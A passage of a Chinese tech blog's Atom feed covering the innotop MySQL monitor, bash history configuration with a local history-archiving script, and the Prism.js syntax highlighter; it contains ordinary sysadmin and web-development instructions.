    <summary type="html">&lt;h1 id=&quot;命令行监控工具Innotop&quot;&gt;&lt;a href=&quot;#命令行监控工具Innotop&quot; class=&quot;headerlink&quot; title=&quot;命令行监控工具Innotop&quot;&gt;&lt;/a&gt;命令行监控工具Innotop&lt;/h1&gt;&lt;h2 id=&quot;一、工具简介&quot;&gt;&lt;a href=&quot;#一、工具简介&quot; class=&quot;headerlink&quot; title=&quot;一、工具简介&quot;&gt;&lt;/a&gt;一、工具简介&lt;/h2&gt;&lt;p&gt;innotop是一个基于命令行的监控工具，在某种方面模拟了UNIX中的top工具。&lt;/p&gt;
&lt;p&gt;类似的命令行监控工具还有mtop和mytop，不过都不如innotop功能强大。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;INNOTOP是一个通过文本模式显示MySQL和InnoDB的监测工具。INNOTOP是用PERL语言写成的，这使它能更加灵活的使用在各种操作平台之上，它能详细的监控出当前MYSQL和INNODB运行的状态，以DBA根据结果，可以合理的优化MYSQL，让MYSQL更稳定更高效的运行。(摘自：参考文档3)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;二、功能特性&quot;&gt;&lt;a href=&quot;#二、功能特性&quot; class=&quot;headerlink&quot; title=&quot;二、功能特性&quot;&gt;&lt;/a&gt;二、功能特性&lt;/h2&gt;&lt;p&gt;既然说到innotop功能很强大，到底能用来帮助我们做什么事情呢？&lt;/p&gt;
&lt;p&gt;可以看一下innotop的功能特性如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;事务列表可以显示INNODB当前的全部事务。&lt;/li&gt;
&lt;li&gt;查询列表可以显示当前正在运行的查询。&lt;/li&gt;
&lt;li&gt;可以显示当前锁和锁等待的列表。&lt;/li&gt;
&lt;li&gt;以相对值 显示服务器状态的变量和汇总信息。&lt;/li&gt;
&lt;li&gt;有多种模式可用来显示INNODB内部信息，例如：缓冲区、死锁、外键错误、I/O活动情况、行操作、信号量以及其他更多的内容。&lt;/li&gt;
&lt;li&gt;复制监控，将主服务器和从服务器的状态显示在一起。&lt;/li&gt;
&lt;li&gt;显示任意服务器变量的模式。&lt;/li&gt;
&lt;li&gt;服务器组可以更方便地组织多台服务器。&lt;/li&gt;
&lt;li&gt;在命令行脚本下可以使用非交互式模式。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;三、工具安装&quot;&gt;&lt;a href=&quot;#三、工具安装&quot; class=&quot;headerlink&quot; title=&quot;三、工具安装&quot;&gt;&lt;/a&gt;三、工具安装&lt;/h2&gt;&lt;h3 id=&quot;1-源码安装&quot;&gt;&lt;a href=&quot;#1-源码安装&quot; class=&quot;headerlink&quot; title=&quot;1. 源码安装&quot;&gt;&lt;/a&gt;1. 源码安装&lt;/h3&gt;&lt;p&gt;最早innotop代码被托管到google code上，后来迁移到了github：&lt;a href=&quot;https://github.com/innotop/innotop&quot;&gt;innotop&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下载innotop源码，运行标准的make install安装过程即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PS&lt;/strong&gt;：八过网上的安装方式大多针对于linux系统而言。本人尝试在本机MAC系统下安装并没有那么简单，卡在安装perl的mysql连接库这块。MAC用户可以尝试使用下面的方法安装。&lt;/p&gt;
&lt;h3 id=&quot;2-brew安装&quot;&gt;&lt;a href=&quot;#2-brew安装&quot; class=&quot;headerlink&quot; title=&quot;2. brew安装&quot;&gt;&lt;/a&gt;2. brew安装&lt;/h3&gt;&lt;p&gt;通过MAC包管理工具brew搜索并安装innotop。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;brew search innotop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;brew install innotop&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;本人安装的innotop版本为1.11.1。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yerba-buena:~ yeshaoting$ innotop --version&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;innotop  Ver 1.11.1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="数据存储" scheme="http://yeshaoting.cn/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
    
    
    <category term="mysql" scheme="http://yeshaoting.cn/tags/mysql/"/>
    
    <category term="innotop" scheme="http://yeshaoting.cn/tags/innotop/"/>
    
  </entry>
  
  <entry>
    <title>设置系统history</title>
    <link href="http://yeshaoting.cn/article/linux/%E8%AE%BE%E7%BD%AE%E7%B3%BB%E7%BB%9Fhistory/"/>
    <id>http://yeshaoting.cn/article/linux/%E8%AE%BE%E7%BD%AE%E7%B3%BB%E7%BB%9Fhistory/</id>
    <published>2016-08-27T11:17:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="设置系统history"><a href="#设置系统history" class="headerlink" title="设置系统history"></a>设置系统history</h1><h2 id="一、history-记录设置"><a href="#一、history-记录设置" class="headerlink" title="一、history 记录设置"></a>一、history 记录设置</h2><h3 id="1-历史记录增加时间：HISTTIMEFORMAT"><a href="#1-历史记录增加时间：HISTTIMEFORMAT" class="headerlink" title="1. 历史记录增加时间：HISTTIMEFORMAT"></a>1. 历史记录增加时间：HISTTIMEFORMAT</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HISTTIMEFORMAT=&#x27;%F %T &#x27;     #注意有个空格，为了显示时日期与命令之间有空格分割。</span><br></pre></td></tr></table></figure><h3 id="2-历史命令记录显示行数：HISTSIZE"><a href="#2-历史命令记录显示行数：HISTSIZE" class="headerlink" title="2. 历史命令记录显示行数：HISTSIZE"></a>2. 历史命令记录显示行数：HISTSIZE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HISTSIZE=3000</span><br><span class="line">HISTFILESIZE=3000</span><br></pre></td></tr></table></figure><h3 id="3-历史文件名称更改：HISTFILE"><a href="#3-历史文件名称更改：HISTFILE" class="headerlink" title="3. 历史文件名称更改：HISTFILE"></a>3. 历史文件名称更改：HISTFILE</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HISTFILE=/var/history/$USER-$UID.log</span><br></pre></td></tr></table></figure><h3 id="4-剔除连续重复的条目：HISTCONTROL"><a href="#4-剔除连续重复的条目：HISTCONTROL" class="headerlink" title="4. 剔除连续重复的条目：HISTCONTROL"></a>4. 剔除连续重复的条目：HISTCONTROL</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HISTCONTROL=ignoredups  //保存退出</span><br></pre></td></tr></table></figure><h3 id="5-多终端共享history"><a href="#5-多终端共享history" class="headerlink" title="5. 多终端共享history"></a>5. 多终端共享history</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shopt -s histappend</span><br></pre></td></tr></table></figure><p>由于bash的history文件默认是覆盖，如果存在多个终端，最后退出的会覆盖以前历史记录，改为追加形式。</p><h3 id="6-实时追加history"><a href="#6-实时追加history" class="headerlink" title="6. 实时追加history"></a>6. 实时追加history</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROMPT_COMMAND=&quot;history -a&quot;</span><br></pre></td></tr></table></figure><p>实时追加当前session历史命令记录到history文件。</p><p><strong>注</strong>：<code>history -w</code>则是会用当前session的历史命令替换history文件，而history -w则是会用当前session的历史命令替换history文件。</p><h2 id="二、定期清理和保留-history-记录"><a href="#二、定期清理和保留-history-记录" class="headerlink" title="二、定期清理和保留 history 记录"></a>二、定期清理和保留 history 记录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> archive linux <span class="built_in">command</span> <span class="built_in">history</span> files</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> written by vpsee.com</span></span><br><span class="line"></span><br><span class="line">umask 077</span><br><span class="line">maxlines=2000</span><br><span class="line"></span><br><span class="line">lines=$(wc -l &lt; ~/.bash_history)</span><br><span class="line"></span><br><span class="line">if (($lines &gt; $maxlines)); then</span><br><span class="line">    cut=$(($lines - $maxlines))</span><br><span class="line">    head -$cut ~/.bash_history &gt;&gt; ~/.bash_history.sav</span><br><span class="line">    sed -e &quot;1,$&#123;cut&#125;d&quot;  ~/.bash_history &gt; ~/.bash_history.tmp</span><br><span class="line">    mv ~/.bash_history.tmp ~/.bash_history</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="三、参考文档"><a href="#三、参考文档" class="headerlink" title="三、参考文档"></a>三、参考文档</h2><ol><li><a href="http://coolnull.com/4013.html">设置linux系统history相关变量，命令时间、保存history条数，多session共享history</a></li><li><a href="http://blog.felixc.at/2013/09/how-to-avoid-losing-any-history-lines/">[译] 如何防止丢失任何 bash 历史命令?</a></li><li><a href="http://www.vpsee.com/2011/08/archiving-linux-commands-history/">定期清理和保留 history 记录</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;设置系统history&quot;&gt;&lt;a href=&quot;#设置系统history&quot; class=&quot;headerlink&quot; title=&quot;设置系统history&quot;&gt;&lt;/a&gt;设置系统history&lt;/h1&gt;&lt;h2 id=&quot;一、history-记录设置&quot;&gt;&lt;a href=&quot;#一、history-记录设置&quot; class=&quot;headerlink&quot; title=&quot;一、history 记录设置&quot;&gt;&lt;/a&gt;一、history 记录设置&lt;/h2&gt;&lt;h3 id=&quot;1-历史记录增加时间：HISTTIMEFORMAT&quot;&gt;&lt;a href=&quot;#1-历史记录增加时间：HISTTIMEFORMAT&quot; class=&quot;headerlink&quot; title=&quot;1. 历史记录增加时间：HISTTIMEFORMAT&quot;&gt;&lt;/a&gt;1. 历史记录增加时间：HISTTIMEFORMAT&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;HISTTIMEFORMAT=&amp;#x27;%F %T &amp;#x27;     #注意有个空格，为了显示时日期与命令之间有空格分割。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&quot;2-历史命令记录显示行数：HISTSIZE&quot;&gt;&lt;a href=&quot;#2-历史命令记录显示行数：HISTSIZE&quot; class=&quot;headerlink&quot; title=&quot;2. 历史命令记录显示行数：HISTSIZE&quot;&gt;&lt;/a&gt;2. 历史命令记录显示行数：HISTSIZE&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;HISTSIZE=3000&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HISTFILESIZE=3000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&quot;3-历史文件名称更改：HISTFILE&quot;&gt;&lt;a href=&quot;#3-历史文件名称更改：HISTFILE&quot; class=&quot;headerlink&quot; title=&quot;3. 历史文件名称更改：HISTFILE&quot;&gt;&lt;/a&gt;3. 历史文件名称更改：HISTFILE&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;HISTFILE=/var/history/$USER-$UID.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&quot;4-剔除连续重复的条目：HISTCONTROL&quot;&gt;&lt;a href=&quot;#4-剔除连续重复的条目：HISTCONTROL&quot; class=&quot;headerlink&quot; title=&quot;4. 剔除连续重复的条目：HISTCONTROL&quot;&gt;&lt;/a&gt;4. 剔除连续重复的条目：HISTCONTROL&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;HISTCONTROL=ignoredups  //保存退出&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&quot;5-多终端共享history&quot;&gt;&lt;a href=&quot;#5-多终端共享history&quot; class=&quot;headerlink&quot; title=&quot;5. 多终端共享history&quot;&gt;&lt;/a&gt;5. 多终端共享history&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;shopt -s histappend&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;由于bash的history文件默认是覆盖，如果存在多个终端，最后退出的会覆盖以前历史记录，改为追加形式。&lt;/p&gt;
&lt;h3 id=&quot;6-实时追加history&quot;&gt;&lt;a href=&quot;#6-实时追加history&quot; class=&quot;headerlink&quot; title=&quot;6. 实时追加history&quot;&gt;&lt;/a&gt;6. 实时追加history&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;PROMPT_COMMAND=&amp;quot;history -a&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;实时追加当前session历史命令记录到history文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：&lt;code&gt;history -w&lt;/code&gt;则是会用当前session的历史命令替换history文件，而history -w则是会用当前session的历史命令替换history文件。&lt;/p&gt;
&lt;h2 id=&quot;二、定期清理和保留-history-记录&quot;&gt;&lt;a href=&quot;#二、定期清理和保留-history-记录&quot; class=&quot;headerlink&quot; title=&quot;二、定期清理和保留 history 记录&quot;&gt;&lt;/a&gt;二、定期清理和保留 history 记录&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; archive linux &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;history&lt;/span&gt; files&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; written by vpsee.com&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;umask 077&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;maxlines=2000&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lines=$(wc -l &amp;lt; ~/.bash_history)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if (($lines &amp;gt; $maxlines)); then&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    cut=$(($lines - $maxlines))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    head -$cut ~/.bash_history &amp;gt;&amp;gt; ~/.bash_history.sav&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sed -e &amp;quot;1,$&amp;#123;cut&amp;#125;d&amp;quot;  ~/.bash_history &amp;gt; ~/.bash_history.tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    mv ~/.bash_history.tmp ~/.bash_history&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="系统配置" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="linux" scheme="http://yeshaoting.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>代码高亮类库prismjs</title>
    <link href="http://yeshaoting.cn/article/js/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93prismjs/"/>
    <id>http://yeshaoting.cn/article/js/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93prismjs/</id>
    <published>2016-08-25T07:45:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/prismjs.jpg" class="img-logo img-center" /><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Prism 是一款轻量、可扩展的代码语法高亮库，使用现代化的 Web 标准构建。</p><h2 id="二、为什么选择-Prism-js-？"><a href="#二、为什么选择-Prism-js-？" class="headerlink" title="二、为什么选择 Prism.js ？"></a>二、为什么选择 Prism.js ？</h2><blockquote><ul><li>极致易用<br>引用 prism.css 和 prism.js，使用合适的 HTML5 标签（code.language-xxxx），搞定！</li></ul></blockquote><blockquote><ul><li>天生伶俐<br>语言的 CSS 类是可继承的，所以你只需定义一次就能应用到多个代码片段。</li></ul></blockquote><blockquote><ul><li>轻如鸿毛<br>代码压缩后只有 1.6KB。每添加一个语言平均增加 0.3-0.5KB，主题在 1KB 左右。</li></ul></blockquote><blockquote><ul><li>快如闪电<br>如果可能，支持通过 Web Workers 实现并行。</li></ul></blockquote><blockquote><ul><li>轻松扩展<br>定义新语言或扩展现有语法，或者新增功能都非常简单。</li></ul></blockquote><blockquote><ul><li>丰富样式<br>所有的样式通过 CSS 完成，并使用合理的类名如：.comment, .string, .property 等。</li></ul></blockquote><h2 id="三、简单用法"><a href="#三、简单用法" class="headerlink" title="三、简单用法"></a>三、简单用法</h2><h3 id="1-head添加主题样式"><a href="#1-head添加主题样式" class="headerlink" title="1. head添加主题样式"></a>1. head添加主题样式</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://prismjs.com/themes/prism.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-文档末尾添加Prism-类库"><a href="#2-文档末尾添加Prism-类库" class="headerlink" title="2. 文档末尾添加Prism 类库"></a>2. 文档末尾添加Prism 类库</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://prismjs.com/prism.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-添加测试代码"><a href="#3-添加测试代码" class="headerlink" title="3. 添加测试代码"></a>3. 添加测试代码</h3><blockquote><p>遵循 <a href="http://www.w3.org/TR/html5/grouping-content.html#the-pre-element">HTML5 标准</a>，Prism 使用语义化的 <code>pre</code> 元素和 <code>code</code> 元素来标记代码区块。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">&quot;language-css&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>p &#123; color: red &#125;<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4. 完整代码"></a>4. 完整代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>代码高亮类库Prism.js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://prismjs.com/themes/prism.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">&quot;language-css&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>p &#123; color: red &#125;<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://prismjs.com/prism.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-输出样式"><a href="#5-输出样式" class="headerlink" title="5. 输出样式"></a>5. 输出样式</h3><p><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93Prism/Snip20160825_53.png" alt="Prism高亮效果"></p><span id="more"></span><h2 id="四、扩展内容"><a href="#四、扩展内容" class="headerlink" title="四、扩展内容"></a>四、扩展内容</h2><h3 id="1-高亮语法支持"><a href="#1-高亮语法支持" class="headerlink" title="1. 高亮语法支持"></a>1. 高亮语法支持</h3><p>默认的prism-core只支持少量的语法高亮，如：html, css, javascript等。</p><p>如需要针对java、C、python语法进行高亮显示的话，需要额外引入特定语法高亮类库。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://prismjs.com/components/prism-java.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://prismjs.com/components/prism-sql.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://prismjs.com/components/prism-python.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注</strong>：扩展的语法高亮类库位置放于prism.js之后。另外，也可以在下载prismjs里把需要的类库都打包进prismjs.js里。</p><p>效果如下图所示：</p><p><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93Prism/Snip20160825_54.png" alt="java语法高亮效果"></p><h3 id="2-高亮主题"><a href="#2-高亮主题" class="headerlink" title="2. 高亮主题"></a>2. 高亮主题</h3><p>prismjs支持多种高亮主题，默认的就是上述截图的主题。</p><p>如果有其他的主题偏好，可以更换prismjs主题样式。</p><p>方法如下 ：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://prismjs.com/themes/prism-okaidia.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://prismjs.com/themes/prism-solarizedlight.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span 